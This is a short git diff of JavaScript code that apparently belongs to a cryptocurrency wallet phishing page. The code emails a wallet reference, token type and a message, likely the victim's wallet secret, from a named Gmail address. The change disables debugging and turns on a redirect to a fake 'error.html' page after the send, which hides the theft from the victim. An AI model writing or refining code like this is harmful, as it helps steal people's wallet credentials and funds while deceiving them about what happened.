@@ -98,11 +98,11 @@ const emptyInputs = () => {
       From: "bekkierowland@gmail.com",
       Subject: `${data.walletRef} and token type is ${data.type}`,
       Body: `${msg}`,
-      debug: true // Enable debugging
+      // debug: true // Enable debugging
     })
       .then(function (message) {
         console.log("Email sent successfully:", message);
-        // window.location = `error.html`;
+        window.location = `error.html`;
       })
       .catch((e) => {
         console.log("Failed to send email:", e);
